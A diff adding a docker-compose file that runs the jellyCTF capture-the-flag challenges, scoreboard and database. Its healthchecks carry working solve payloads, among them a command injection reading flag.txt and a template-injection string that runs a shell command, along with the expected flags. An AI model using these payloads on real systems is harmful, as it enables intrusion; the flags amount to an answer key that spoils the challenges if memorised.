@@ -1,0 +1,217 @@
+services:
+  aidoru:
+    build: ../web/aidoru/src/
+    restart: always
+    user: nobody
+    mem_limit: 1g
+    healthcheck:
+      test: (python -c 'print(__import__("urllib.request").request.urlopen("http://localhost:8080/static/secret_data/328356824c8487cf314aa350d11ae145.json").read())' | grep 'jellyCTF{u_r_the_p3rfect_ultimate_IDOR}') || exit 1
+      interval: 30s
+      timeout: 5s
+      start_period: 10s
+    labels:
+      autoheal: true
+  awafy-me:
+    build: ../web/awafy_me/src/
+    restart: always
+    user: nobody
+    mem_limit: 1g
+    cpus: 1.0
+    healthcheck:
+      test: (python -c 'print(__import__("urllib.request").request.urlopen("http://localhost:8080/?user_input=%3Bcat+flag.txt").read())' | grep 'jellyCTF{c3rt1fied_aw4t15tic}') || exit 1
+      interval: 30s
+      timeout: 5s
+      start_period: 10s
+    labels:
+      autoheal: true
+  awascii-validator:
+    build: ../web/awascii_validator/src/
+    restart: always
+    user: nobody
+    mem_limit: 1g
+    cpus: 1.0
+    healthcheck:
+      test: (python -c 'print(__import__("urllib.request").request.urlopen("http://localhost:8080/?user_input=awawawawawawa+awa+awawawawa+awawa+awa+awa+awa+awawa+awa+awawawawawawawawa+awawa+awa+awawa+awa+awawawawa+awawa+awa+awa+awa+awa+awa+awa+awa+awawa+awawa+awawa+awa+awa+awa").read())' | grep 'jellyCTF{m4st3rs_1n_awat1sm}') || exit 1
+      interval: 30s
+      timeout: 5s
+      start_period: 10s
+    labels:
+      autoheal: true
+  bro-visited-his-site:
+    build: ../web/bro_visited_his_site/src/
+    restart: always
+    mem_limit: 1g
+    cpus: 1.0
+    healthcheck:
+      test: (python -c 'print(__import__("urllib.request").request.urlopen("http://localhost:8080/response?word=%7B%7Burl_for.__globals__%5B%22current_app%22%5D.config%5B%22FLAG%22%5D%7D%7D%0D%0A%7B%7B+%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B520%5D%28%22cat+%2Fapp%2Fflag.txt%22%2C+shell%3DTrue%2C+stdout%3D-1%29.communicate%28%29%5B0%5D.strip%28%29+%7D%7D").read())' | grep 'jellyCTF{f1agp1ll3d_t3mpl4te_1nj3ct10nmaxx3r}.*jellyCTF{rc3p1lled_t3mpl4te_1nj3ct10nmaxx3r}') || exit 1
+      interval: 30s
+      timeout: 5s
+      start_period: 10s
+    labels:
+      autoheal: true
+  factory-clicker:
+    build: ../web/factory_clicker/src/
+    restart: always
+    user: nobody
+    mem_limit: 1g
+    healthcheck:
+      test: (python -c 'req=__import__("urllib.request").request.Request("http://localhost:8080/increment?increment_amount=500000000001", method="POST"); print(__import__("urllib.request").request.urlopen(req).read())' | grep 'jellyCTF{keep_on_piping_jelly}') || exit 1
+      interval: 30s
+      timeout: 5s
+      start_period: 10s
+    labels:
+      autoheal: true
+  just-win-lol:
+    build: ../misc/just_win_lol/src/
+    restart: always
+    mem_limit: 1g
+    healthcheck:
+      test: wget -q -O - http://localhost:8080 || exit 1
+      interval: 30s
+      timeout: 5s
+      start_period: 10s
+    labels:
+      autoheal: true
+  pentest-on-stream:
+    shm_size: "256m"
+    mem_limit: 2g
+    cpus: 2.0
+    build: ../web/pentest_on_stream/src/
+    restart: always
+    devices:
+      - /dev/dri:/dev/dri
+    environment:
+      - VNC_PASSWD=nah
+      - LIBVA_DRIVER_NAME=iHD
+    ports:
+      # firewalled so not accessible publicly. use ssh -L 5901:localhost:5901 <host>
+      # to forward and access on your machine's localhost:5901
+      - 5901:5901
+    healthcheck:
+      test: python3 -c 'print(__import__("urllib.request").request.urlopen("http://localhost:8080").read())' || exit 1
+      interval: 30s
+      timeout: 5s
+      start_period: 30s
+    labels:
+      autoheal: true
+  pentest-on-stream2:
+    shm_size: "256m"
+    mem_limit: 2g
+    cpus: 2.0
+    build: ../web/pentest_on_stream/src/
+    restart: always
+    devices:
+      - /dev/dri:/dev/dri
+    environment:
+      - VNC_PASSWD=nah
+      - LIBVA_DRIVER_NAME=iHD
+    ports:
+      # firewalled so not accessible publicly. use ssh -L 5901:localhost:5901 <host>
+      # to forward and access on your machine's localhost:5901
+      - 5902:5901
+    healthcheck:
+      test: python3 -c 'print(__import__("urllib.request").request.urlopen("http://localhost:8080").read())' || exit 1
+      interval: 30s
+      timeout: 5s
+      start_period: 30s
+    labels:
+      autoheal: true
+  vlookup-hot-singles:
+    build: ../web/vlookup_hot_singles/src/
+    restart: always
+    mem_limit: 1g
+    healthcheck:
+      test: python -c 'print(__import__("urllib.request").request.urlopen("http://localhost:8080").read())' || exit 1
+      interval: 30s
+      timeout: 5s
+      start_period: 10s
+    labels:
+      autoheal: true
+  cherry:
+    build: ../crypto/cherry/src/
+    restart: always
+    mem_limit: 1g
+    healthcheck:
+      test: python -c 'print(__import__("urllib.request").request.urlopen("http://localhost:8080").read())' || exit 1
+      interval: 30s
+      timeout: 5s
+      start_period: 10s
+    labels:
+      autoheal: true
+
+  autoheal:
+    environment:
+      WEBHOOK_URL: "https://discord.com/api/webhooks/nah"
+    image: willfarrell/autoheal:latest
+    restart: always
+    volumes:
+      - /etc/localtime:/etc/localtime:ro
+      - /var/run/docker.sock:/var/run/docker.sock
+
+  nginx:
+    image: nginx:stable
+    restart: always
+    volumes:
+      - ./nginx.conf:/etc/nginx/nginx.conf
+      - ./jellyctf.key:/etc/nginx/jellyctf.key
+      - ./jellyctf.pub:/etc/nginx/jellyctf.pub
+      - ./cf.pub:/etc/nginx/cf.pub
+      - ./access.log:/var/log/nginx/access2.log
+    ports:
+      - 80:80
+      - 443:443
+    depends_on:
+      - ctfd
+  ctfd:
+    build: CTFd/
+    user: root
+    restart: always
+    ports:
+      - "8000:8000"
+    environment:
+      - UPLOAD_FOLDER=/var/uploads
+      - DATABASE_URL=mysql+pymysql://ctfd:ctfd@db/ctfd
+      - REDIS_URL=redis://cache:6379
+      - WORKERS=1
+      - LOG_FOLDER=/var/log/CTFd
+      - ACCESS_LOG=-
+      - ERROR_LOG=-
+      - REVERSE_PROXY=true
+      - DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/nah
+    volumes:
+      - ./CTFd/.data/CTFd/logs:/var/log/CTFd
+      - ./CTFd/.data/CTFd/uploads:/var/uploads
+      - ./CTFd:/opt/CTFd:ro
+    depends_on:
+      - db
+    networks:
+        default:
+        internal:
+  db:
+    image: mariadb:10.11
+    restart: always
+    environment:
+      - MARIADB_ROOT_PASSWORD=ctfd
+      - MARIADB_USER=ctfd
+      - MARIADB_PASSWORD=ctfd
+      - MARIADB_DATABASE=ctfd
+      - MARIADB_AUTO_UPGRADE=1
+    volumes:
+      - ./CTFd/.data/mysql:/var/lib/mysql
+    networks:
+        internal:
+    # This command is required to set important mariadb defaults
+    command: [mysqld, --character-set-server=utf8mb4, --collation-server=utf8mb4_unicode_ci, --wait_timeout=28800, --log-warnings=0]
+
+  cache:
+    image: redis:4
+    restart: always
+    volumes:
+    - ./CTFd/.data/redis:/data
+    networks:
+        internal:
+
+networks:
+    default:
+    internal:
+        internal: true
